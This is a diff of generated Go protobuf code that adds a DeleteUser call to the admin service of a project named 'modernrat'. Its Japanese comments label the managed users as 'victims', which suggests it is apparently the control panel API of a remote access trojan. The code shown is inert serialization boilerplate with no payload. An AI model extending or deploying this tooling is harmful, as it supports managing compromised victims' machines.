@@ -520,6 +520,112 @@ func (x *ListUsersResponse) GetMessage() string {
 	return ""
 }
 
+// 被害者削除リクエスト
+type DeleteUserRequest struct {
+	state         protoimpl.MessageState `protogen:"open.v1"`
+	UserId        string                 `protobuf:"bytes,1,opt,name=user_id,json=userId,proto3" json:"user_id,omitempty"` // 削除対象の被害者ID
+	unknownFields protoimpl.UnknownFields
+	sizeCache     protoimpl.SizeCache
+}
+
+func (x *DeleteUserRequest) Reset() {
+	*x = DeleteUserRequest{}
+	mi := &file_admin_service_proto_msgTypes[7]
+	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
+	ms.StoreMessageInfo(mi)
+}
+
+func (x *DeleteUserRequest) String() string {
+	return protoimpl.X.MessageStringOf(x)
+}
+
+func (*DeleteUserRequest) ProtoMessage() {}
+
+func (x *DeleteUserRequest) ProtoReflect() protoreflect.Message {
+	mi := &file_admin_service_proto_msgTypes[7]
+	if x != nil {
+		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
+		if ms.LoadMessageInfo() == nil {
+			ms.StoreMessageInfo(mi)
+		}
+		return ms
+	}
+	return mi.MessageOf(x)
+}
+
+// Deprecated: Use DeleteUserRequest.ProtoReflect.Descriptor instead.
+func (*DeleteUserRequest) Descriptor() ([]byte, []int) {
+	return file_admin_service_proto_rawDescGZIP(), []int{7}
+}
+
+func (x *DeleteUserRequest) GetUserId() string {
+	if x != nil {
+		return x.UserId
+	}
+	return ""
+}
+
+// 被害者削除レスポンス
+type DeleteUserResponse struct {
+	state         protoimpl.MessageState `protogen:"open.v1"`
+	Success       bool                   `protobuf:"varint,1,opt,name=success,proto3" json:"success,omitempty"`            // 削除成功フラグ
+	Message       string                 `protobuf:"bytes,2,opt,name=message,proto3" json:"message,omitempty"`             // メッセージ
+	UserId        string                 `protobuf:"bytes,3,opt,name=user_id,json=userId,proto3" json:"user_id,omitempty"` // 削除した被害者ID
+	unknownFields protoimpl.UnknownFields
+	sizeCache     protoimpl.SizeCache
+}
+
+func (x *DeleteUserResponse) Reset() {
+	*x = DeleteUserResponse{}
+	mi := &file_admin_service_proto_msgTypes[8]
+	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
+	ms.StoreMessageInfo(mi)
+}
+
+func (x *DeleteUserResponse) String() string {
+	return protoimpl.X.MessageStringOf(x)
+}
+
+func (*DeleteUserResponse) ProtoMessage() {}
+
+func (x *DeleteUserResponse) ProtoReflect() protoreflect.Message {
+	mi := &file_admin_service_proto_msgTypes[8]
+	if x != nil {
+		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
+		if ms.LoadMessageInfo() == nil {
+			ms.StoreMessageInfo(mi)
+		}
+		return ms
+	}
+	return mi.MessageOf(x)
+}
+
+// Deprecated: Use DeleteUserResponse.ProtoReflect.Descriptor instead.
+func (*DeleteUserResponse) Descriptor() ([]byte, []int) {
+	return file_admin_service_proto_rawDescGZIP(), []int{8}
+}
+
+func (x *DeleteUserResponse) GetSuccess() bool {
+	if x != nil {
+		return x.Success
+	}
+	return false
+}
+
+func (x *DeleteUserResponse) GetMessage() string {
+	if x != nil {
+		return x.Message
+	}
+	return ""
+}
+
+func (x *DeleteUserResponse) GetUserId() string {
+	if x != nil {
+		return x.UserId
+	}
+	return ""
+}
+
 var File_admin_service_proto protoreflect.FileDescriptor
 
 const file_admin_service_proto_rawDesc = "" +
@@ -566,11 +672,19 @@ const file_admin_service_proto_rawDesc = "" +
 	"totalCount\x12\x12\n" +
 	"\x04page\x18\x04 \x01(\x05R\x04page\x12\x1b\n" +
 	"\tpage_size\x18\x05 \x01(\x05R\bpageSize\x12\x18\n" +
-	"\amessage\x18\x06 \x01(\tR\amessage2\xfb\x01\n" +
+	"\amessage\x18\x06 \x01(\tR\amessage\",\n" +
+	"\x11DeleteUserRequest\x12\x17\n" +
+	"\auser_id\x18\x01 \x01(\tR\x06userId\"a\n" +
+	"\x12DeleteUserResponse\x12\x18\n" +
+	"\asuccess\x18\x01 \x01(\bR\asuccess\x12\x18\n" +
+	"\amessage\x18\x02 \x01(\tR\amessage\x12\x17\n" +
+	"\auser_id\x18\x03 \x01(\tR\x06userId2\xc6\x02\n" +
 	"\fAdminService\x12a\n" +
 	"\x12GenerateAdminToken\x12$.modernrat.GenerateAdminTokenRequest\x1a%.modernrat.GenerateAdminTokenResponse\x12@\n" +
 	"\aGetUser\x12\x19.modernrat.GetUserRequest\x1a\x1a.modernrat.GetUserResponse\x12F\n" +
-	"\tListUsers\x12\x1b.modernrat.ListUsersRequest\x1a\x1c.modernrat.ListUsersResponseB\x1cZ\x1agithub.com/modernrat/protob\x06proto3"
+	"\tListUsers\x12\x1b.modernrat.ListUsersRequest\x1a\x1c.modernrat.ListUsersResponse\x12I\n" +
+	"\n" +
+	"DeleteUser\x12\x1c.modernrat.DeleteUserRequest\x1a\x1d.modernrat.DeleteUserResponseB\x1cZ\x1agithub.com/modernrat/protob\x06proto3"
 
 var (
 	file_admin_service_proto_rawDescOnce sync.Once
@@ -584,7 +698,7 @@ func file_admin_service_proto_rawDescGZIP() []byte {
 	return file_admin_service_proto_rawDescData
 }
 
-var file_admin_service_proto_msgTypes = make([]protoimpl.MessageInfo, 7)
+var file_admin_service_proto_msgTypes = make([]protoimpl.MessageInfo, 9)
 var file_admin_service_proto_goTypes = []any{
 	(*GenerateAdminTokenRequest)(nil),  // 0: modernrat.GenerateAdminTokenRequest
 	(*GenerateAdminTokenResponse)(nil), // 1: modernrat.GenerateAdminTokenResponse
@@ -593,19 +707,23 @@ var file_admin_service_proto_goTypes = []any{
 	(*ListUsersRequest)(nil),           // 4: modernrat.ListUsersRequest
 	(*UserSummary)(nil),                // 5: modernrat.UserSummary
 	(*ListUsersResponse)(nil),          // 6: modernrat.ListUsersResponse
-	(*SystemInfo)(nil),                 // 7: modernrat.SystemInfo
+	(*DeleteUserRequest)(nil),          // 7: modernrat.DeleteUserRequest
+	(*DeleteUserResponse)(nil),         // 8: modernrat.DeleteUserResponse
+	(*SystemInfo)(nil),                 // 9: modernrat.SystemInfo
 }
 var file_admin_service_proto_depIdxs = []int32{
-	7, // 0: modernrat.GetUserResponse.system_info:type_name -> modernrat.SystemInfo
+	9, // 0: modernrat.GetUserResponse.system_info:type_name -> modernrat.SystemInfo
 	5, // 1: modernrat.ListUsersResponse.users:type_name -> modernrat.UserSummary
 	0, // 2: modernrat.AdminService.GenerateAdminToken:input_type -> modernrat.GenerateAdminTokenRequest
 	2, // 3: modernrat.AdminService.GetUser:input_type -> modernrat.GetUserRequest
 	4, // 4: modernrat.AdminService.ListUsers:input_type -> modernrat.ListUsersRequest
-	1, // 5: modernrat.AdminService.GenerateAdminToken:output_type -> modernrat.GenerateAdminTokenResponse
-	3, // 6: modernrat.AdminService.GetUser:output_type -> modernrat.GetUserResponse
-	6, // 7: modernrat.AdminService.ListUsers:output_type -> modernrat.ListUsersResponse
-	5, // [5:8] is the sub-list for method output_type
-	2, // [2:5] is the sub-list for method input_type
+	7, // 5: modernrat.AdminService.DeleteUser:input_type -> modernrat.DeleteUserRequest
+	1, // 6: modernrat.AdminService.GenerateAdminToken:output_type -> modernrat.GenerateAdminTokenResponse
+	3, // 7: modernrat.AdminService.GetUser:output_type -> modernrat.GetUserResponse
+	6, // 8: modernrat.AdminService.ListUsers:output_type -> modernrat.ListUsersResponse
+	8, // 9: modernrat.AdminService.DeleteUser:output_type -> modernrat.DeleteUserResponse
+	6, // [6:10] is the sub-list for method output_type
+	2, // [2:6] is the sub-list for method input_type
 	2, // [2:2] is the sub-list for extension type_name
 	2, // [2:2] is the sub-list for extension extendee
 	0, // [0:2] is the sub-list for field type_name
@@ -623,7 +741,7 @@ func file_admin_service_proto_init() {
 			GoPackagePath: reflect.TypeOf(x{}).PkgPath(),
 			RawDescriptor: unsafe.Slice(unsafe.StringData(file_admin_service_proto_rawDesc), len(file_admin_service_proto_rawDesc)),
 			NumEnums:      0,
-			NumMessages:   7,
+			NumMessages:   9,
 			NumExtensions: 0,
 			NumServices:   1,
 		},
